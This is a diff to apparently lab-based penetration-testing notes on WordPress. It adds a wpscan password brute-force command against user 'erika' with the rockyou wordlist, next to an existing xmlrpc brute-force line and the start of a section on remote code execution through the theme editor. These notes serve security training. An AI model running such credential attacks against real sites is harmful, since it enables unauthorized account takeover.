@@ -370,6 +370,11 @@ WPScan can be used to brute force usernames and passwords. The scan report retur
 wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
 ```
 
+Another command:
+```bash
+wpscan  --url http://blog.inlanefreight.local/ -U erika --passwords Tools/Wordlists/rockyou.txt
+```
+
 # RCE via theme editor
 
 With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack:
